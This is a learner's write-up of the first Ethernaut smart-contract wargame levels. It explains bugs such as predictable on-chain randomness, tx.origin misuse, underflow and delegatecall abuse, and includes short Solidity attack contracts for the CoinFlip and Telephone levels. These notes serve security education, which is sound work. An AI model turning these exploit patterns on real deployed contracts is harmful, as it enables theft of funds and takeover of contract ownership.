# Ethernaut Notes
Notes on [Ethernaut](https://ethernaut.openzeppelin.com) exercises.

# 00. Ethernaut 
* Just go through the console.
* Check out all the ABIs. 
* Password will be shown in a function. 

# 01. FallBack
* Getting the various RPC functions like the one to send Transaction. 
* Finding the diffrence between receive and fallback functions in solidity. 
* Sending ether to contract thus changing the owner to msg.sender.

# 02. Fallout
* Read the code.
* Just Calling Fal1out function will make us the owner. 

# 03. Coinflip
* Generating randomness inside a contract using globally available values or Hardcoded values is a Big NO.
* Everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private.
* Using an another contract attacker can hack that randomness.
* Here using Remix IDE we can call that contract inside an malicious contract using the same function we can crack the randomness. 
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract CoinFlipAttack {

  CoinFlip public victim;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimAddress) {
    victim = CoinFlip(_victimAddress);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    victim.flip(side);
    }  
}
```
# 04. Telephone 
* ```tx.origin``` and ```msg.sender``` Shows same value only if EOA (Externally owned address) is used to call.
* By using another Smart contract to call the function we can take advantage of this contract because Smart contracts are not EOA so ```tx.origin``` changes.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TeleAttack {
    Telephone  tele;

    constructor(address _tele) {
        tele = Telephone(_tele);
    }

    function Attack(address _owner) public{
        tele.changeOwner(_owner);
    }
} 
```  
# 05. Token
* As the hint says taking the case of an classic odometer in over vehicles it has a max and min value. What happens when we go beyond that?
* It is called integer Overflow or Underflow many cyber attacks in our history not only in EVM takes advantage of this issue.
* Because uint is an non negative integer type when we transfer an amount greater than 20 our balance will have this underflow situation. 

# 06. Delegation
* As the word meaning say Delegate call uses memory of the orginal contract and can execute codes on the target contract.
* Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. 
* Here by creating a variable to call the ```pwn``` function in the target contract inside the console and passing it through the ```fallout``` function will make us the owner. ```var _pwned = web3.utils.keccak256("pwn()") ```
* Here data passed into the fallout function is used for calling the target contract using ```.delegatecall()```
 
 
